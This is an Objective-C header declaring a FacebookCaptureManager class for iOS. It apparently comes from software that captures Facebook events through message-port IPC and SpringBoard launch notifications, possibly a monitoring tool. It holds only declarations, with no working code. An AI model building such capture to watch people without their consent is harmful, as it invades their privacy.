//
//  FacebookCaptureManager.h
//  FacebookCaptureManager
//
//  Created by Makara Khloth on 12/24/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "EventCapture.h"
#import "MessagePortIPCReader.h"

@class SBDidLaunchNotifier;

@interface FacebookCaptureManager : NSObject <EventCapture, MessagePortIPCDelegate> {
@private
	id <EventDelegate>		mEventDelegate;
	
	MessagePortIPCReader	*mMessagePortReader;
	SBDidLaunchNotifier		*mSBNotifier;
	NSMutableArray			*mFacebookEvents;
}

@property (nonatomic, assign) id <EventDelegate> mEventDelegate;

- (void) prerelease; // Call to cancel the self perform selector

@end
